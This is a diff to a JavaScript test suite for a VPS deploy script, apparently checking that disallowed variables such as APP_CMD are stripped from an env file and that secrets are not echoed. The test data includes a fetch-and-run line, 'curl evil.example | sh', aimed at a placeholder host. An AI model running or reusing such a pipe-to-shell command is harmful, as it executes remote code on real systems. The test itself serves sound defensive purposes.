@@ -408,6 +408,9 @@ describe('deploy/vps/ops.sh', () => {
         'APP_CMD=curl evil.example | sh',
         'MIGRATE_CMD=true',
         'STARTUP_MAX_FAILS=1',
+        'STARTUP_COOLDOWN_MS=1',
+        'STARTUP_COOLDOWN_MAX_MS=1',
+        'DEPLOY_TARGET=amvera',
         'DB_WAIT_TIMEOUT_MS=1',
         'BOT_TOKEN=12345:AAA',
         'ENCRYPTION_KEY=deadbeef',
@@ -431,7 +434,7 @@ describe('deploy/vps/ops.sh', () => {
         ].join('\n') + '\n',
       );
       expect(res.stdout).toMatch(
-        /переменных 6, отброшено 7: APP_CMD APP_PORT DB_WAIT_TIMEOUT_MS MIGRATE_CMD NODE_ENV PORT STARTUP_MAX_FAILS\n/,
+        /переменных 6, отброшено 10: APP_CMD APP_PORT DB_WAIT_TIMEOUT_MS DEPLOY_TARGET MIGRATE_CMD NODE_ENV PORT STARTUP_COOLDOWN_MAX_MS STARTUP_COOLDOWN_MS STARTUP_MAX_FAILS\n/,
       );
       expect(res.stdout + res.stderr).not.toMatch(
         /evil|development|=80|=9\b|deadbeef|AAA/,
